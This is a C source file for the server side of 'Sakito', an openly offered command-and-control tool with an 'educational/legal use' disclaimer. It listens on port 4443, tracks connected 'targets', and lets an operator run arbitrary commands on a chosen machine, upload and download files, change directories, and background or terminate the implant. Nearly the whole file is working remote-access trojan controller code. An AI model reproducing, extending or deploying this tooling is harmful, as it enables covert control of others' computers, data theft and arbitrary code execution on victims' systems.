/*
Coded by d4rkstat1c.
Use this code educationally/legally.
*/
#include "headers/os_check.h"
#if OS_WIN
	#include <WS2tcpip.h>
	#include <Windows.h>
	#include <inttypes.h>
	#pragma comment(lib, "ws2_32.lib")
#elif OS_LIN
	#include <unistd.h>
	#include <limits.h>
	#include <fcntl.h>
	#include <netdb.h>
	#include <arpa/inet.h>
	#include <pthread.h>
	#include <string.h>
#endif

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>

#include "headers/sakito_core.h"
#include "headers/sakito_server_tools.h"

#define PORT 4443

void add_client(Server_map* const s_map, char* const host, const SOCKET client_socket) 
{
	mutex_lock(s_map);

	if (s_map->clients_sz == s_map->clients_alloc)
		s_map->clients = realloc(s_map->clients, (s_map->clients_alloc += MEM_CHUNK) * sizeof(Conn));

	// Add hostname string and client_socket file descriptor to s_map->clients structure.
	s_map->clients[s_map->clients_sz].host = host;
	s_map->clients[s_map->clients_sz].sock = client_socket;
	s_map->clients_sz++;

	mutex_unlock(s_map);
}

// Function to bind socket to specified port.
void bind_socket(const SOCKET listen_socket) 
{
	// Create sockaddr_in structure.
	struct sockaddr_in sin;

	// Assign member values.
	sin.sin_family = AF_INET;
	sin.sin_port = htons(PORT);
	sin.sin_addr.s_addr = htonl(INADDR_ANY);

	// Bind ip address and port to listen_socket.
	if (bind(listen_socket, (struct sockaddr*)&sin, sizeof(sin)) != 0)
		terminate_server(listen_socket, "Socket bind failed with error");

	// Place the listen_socket in listen state.
	if (listen(listen_socket, SOMAXCONN) != 0)
		terminate_server(listen_socket, "An error occured while placing the socket in listening state");
}

void sakito_accept_conns(Server_map* const s_map) 
{
	// Assign member values to connection map object/structure.
	s_map->clients_alloc = MEM_CHUNK;
	s_map->clients_sz = 0;
	s_map->clients = malloc(s_map->clients_alloc * sizeof(Conn));

	while (1) 
	{
		struct sockaddr_in client;
		int c_size = sizeof(client);

		// Client socket object.
		const SOCKET client_socket = accept(s_map->listen_socket, (struct sockaddr*)&client, &c_size);
		if (client_socket == INVALID_SOCKET)
			terminate_server(s_map->listen_socket, "Error accepting client connection");

		// Client's remote name and port.
		char host[NI_MAXHOST] = { 0 };
		char service[NI_MAXHOST] = { 0 };

		if (getnameinfo((struct sockaddr*)&client, c_size, host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) 
		{
			printf("%s connected on port %s\n", host, service);
		}
		else 
		{
			inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
		}

		// Add client oriented data to s_map object.
		add_client(s_map, host, client_socket);
	}
}

void host_chdir(Server_map* const s_map) 
{
	if (chdir(s_map->buf+3) == FAILURE) 
		if (errno) 
			fprintf(stderr, "%s: %s\n\n", s_map->buf+3, strerror(errno));
}

// Function to list/print all available connections to stdout.
void list_connections(Server_map* const s_map) 
{
	printf("\n---------------------------\n");
	printf("---  C0NNECTED SYSTEMS  ---\n");
	printf("--     Hostname: ID      --\n");
	printf("---------------------------\n\n");

	if (s_map->clients_sz) 
	{
		for (size_t i = 0; i < s_map->clients_sz; i++)
			printf("%s: %lu\n", s_map->clients[i].host, i);
		fputc('\n', stdout);
	}
	else 
	{

		printf("No connected targets available.\n\n\n");
	}
}

// Function send change directory command to client.
int client_chdir(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
{
	// '1' is the command code for changing directory.
	buf[3] = '1';
	
	// Send command code + directory string to be parsed.
	if (sakito_tcp_send(client_socket, buf+3, BUFLEN) < 1)
		return FAILURE;

	// Receive _chdir() result.
	if (sakito_tcp_recv(client_socket, buf, 1) < 1)
		return FAILURE;

	if (buf[0] == '0')
		puts("The client's system cannot find the path specified.\n");
 
	return SUCCESS;
}

// Function to terminate/kill client.
int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
{
	// '2' is the command code for terminating/killing the process on the client.
	sakito_tcp_send(client_socket, "2", cmd_len);

	return EXIT_SUCCESS;
}

// Function to receive file from target machine (TCP file transfer).
int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
{
	// '4' is the command code for downloading a file from the client's file-system.
	buf[9] = '4';

	// Send command code + filename to be parsed.
	if (sakito_tcp_send(client_socket, buf+9, cmd_len) < 1)
		return SOCKET_ERROR;
 
	// Receive serialized file size int32_t bytes.
	if (sakito_tcp_recv(client_socket, buf, sizeof(uint32_t)) < 1)
		return SOCKET_ERROR;
 
	// Deserialize file size bytes.
	int32_t f_size = ntohl_conv(buf);

	// Initialize i_result to true/1
	int i_result;

	if (f_size != FAILURE) 
	{
		// Open the file.
		s_file file = sakito_open_file(buf+10, WRITE);
		if (f_size > 0)
			i_result = sakito_recv_file(client_socket, file, buf, f_size);
		
		if (file != INVALID_FILE)
			sakito_close_file(file);
	}
	else 
	{

		puts("The client's system cannot find the file specified.\n");
	}
 
	// Send byte indicating file transfer has finished to prevent overlapping received data.
	if (sakito_tcp_send(client_socket, FTRANSFER_FINISHED, 1) < 1)
		return SOCKET_ERROR;

	return i_result;
}

// Function to upload file to target machine (TCP file transfer).
int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
{
	// Open file.
	s_file file = sakito_open_file(buf+8, READ);
 
	// If the file exists or permission denied:
	if (file == INVALID_FILE) 
	{
		fprintf(stderr, "upload: cannot access: '%s': %s\n\n", buf+8, strerror(errno));

		// Send SERVER_ERROR/'6' control code to client to force client to re-receive command.
		if (sakito_tcp_send(client_socket, "6", 1) < 1)
			return SOCKET_ERROR;

		return FILE_NOT_FOUND;
	}

	// '3' is the command code for uploading a file to the client's file-system.
	buf[7] = '3';

	// Send command code + filename to be parsed.
	if (sakito_tcp_send(client_socket, buf+7, cmd_len) < 1)
		return SOCKET_ERROR;

	// Receive file transfer start byte to prevent received data from overlapping.
	if (sakito_tcp_recv(client_socket, buf, 1) < 1)
		return SOCKET_ERROR;
 
 	// Get size of file.
 	int32_t f_size = sakito_file_size(file);

 	// Send file to client/upload file.
	int i_result = sakito_send_file(client_socket, file, buf, f_size);

	// Close the file.
	sakito_close_file(file);

	return i_result;
}

// Function to terminate/kill client.
int background_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
{
	// '5' is the command code for backgrounding the client.
	if (sakito_tcp_send(client_socket, "5", 1) < 1)
		return SOCKET_ERROR;

	return BACKGROUND;
}

// Function to send command to client to be executed via CreateProcess() and receive output.
int client_exec(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
{
 	buf[0] = '0';
	// Send command to server.
	if (sakito_tcp_send(client_socket, buf, cmd_len) < 1)
		return SOCKET_ERROR;

	memset(buf, '\0', BUFLEN);

	// Receive command output stream and write output chunks to stdout.
	while (1) 
	{
		if (sakito_tcp_recv(client_socket, buf, sizeof(uint32_t)) < 1)
			return SOCKET_ERROR;

		int32_t chunk_size = ntohl_conv(buf);

		if (chunk_size == 0)
			break;

		if (sakito_tcp_recv(client_socket, buf, chunk_size) < 1)
			return SOCKET_ERROR;

		if (write_stdout(buf, chunk_size) == FAILURE) 
		{
			fprintf(stderr, "Error calling WriteFile in client_exec() function: %s\n\n", strerror(errno));
			return FAILURE;
		}
	}

	// Write a single newline to stdout for cmd line output alignment.
	fputc('\n', stdout);

	return SUCCESS;
}

void resize_conns(Server_map* const s_map, int client_id) 
{
	// If there's more than one connection: resize the clients structure member values.
	if (s_map->clients_sz > 1) 
	{
		int max_index = s_map->clients_sz-1;
		for (size_t i = client_id; i < max_index; i++) 
		{
			s_map->clients[i].sock = s_map->clients[i + 1].sock;
			s_map->clients[i].host = s_map->clients[i + 1].host;
		}
		s_map->clients[max_index].sock = 0;
		s_map->clients[max_index].host = NULL;
	}

	s_map->clients_sz--;
}

// Function to resize s_map array/remove and close connection.
void delete_client(Server_map* const s_map, const int client_id) 
{
	mutex_lock(s_map);

	// If the file descriptor is open: close it.
	if (s_map->clients[client_id].sock)
		closesocket(s_map->clients[client_id].sock);

	// Resize clients member values to remove client.
	resize_conns(s_map, client_id);

	mutex_unlock(s_map);
	printf("Client: \"%s\" disconnected.\n\n", s_map->clients[client_id].host);
}

// Function to parse interactive input and send to specified client.
void interact(Server_map* const s_map) 
{
	int client_id = validate_id(s_map);

	if (client_id == FAILURE) 
	{
		puts("Invalid client identifier.");
		return;
	}

	// Send initialization byte to client.
	int i_result = sakito_tcp_send(s_map->clients[client_id].sock, INIT_CONN, 1);

	// Receive and parse input/send commands to client.
	while (i_result > 0) 
	{
		// Receive current working directory.
		if (sakito_tcp_recv(s_map->clients[client_id].sock, s_map->buf, BUFLEN) < 1)
			break;

		printf(INTERACT_FSTR, client_id, s_map->clients[client_id].host, s_map->buf);

		// Set all bytes in buffer to zero.
		memset(s_map->buf, '\0', BUFLEN);

		// Array of command strings to parse stdin with.
		const char commands[5][11] = { "cd ", "exit", "upload ", "download ", "background" };

		// Function pointer array of each c2 command.
		void* func_array[5] = { &client_chdir, &terminate_client, &send_file, &recv_file, &background_client };

		// Parse and execute command function.
		size_t cmd_len = 0;
		const server_func target_func = (const server_func)parse_cmd(s_map->buf+1,
									&cmd_len,
									5,
									commands,
									func_array,
									&client_exec);

		i_result = target_func(s_map->buf, cmd_len+1, s_map->clients[client_id].sock);

		if (i_result == BACKGROUND)
			return;
	}

	// If client disconnected/exit command is parsed: delete the connection.
	delete_client(s_map, client_id);
}

void sakito_console(Server_map* const s_map) 
{
	// Saktio console loop.
	while (1) 
	{
		get_cwd(s_map->buf);
		printf(CONSOLE_FSTR, s_map->buf);

		// Set all bytes in buffer to zero.
		memset(s_map->buf, '\0', BUFLEN);

		// Array of command strings to parse stdin with.
		const char commands[4][11] = { "cd ", "exit", "list", "interact " };

		// Function pointer array of each c2 command.
		void* func_array[4] = { &host_chdir, &terminate_console, &list_connections, &interact };

		// Parse and execute command function.
		size_t cmd_len = 0;
		const console_func target_func = (const console_func)parse_cmd(s_map->buf,
									 &cmd_len,
									 4,
									 commands,
									 func_array,
									 &exec_cmd);

		// Call target function.
		target_func(s_map);
	}
}


// Main function for parsing console input and calling sakito-console functions.
int main(void) 
{
	// Instantiate a Server_map structure.
	Server_map s_map;

	sakito_init(&s_map);

	// Initiate sakito console.
	sakito_console(&s_map);

	return FAILURE;
}
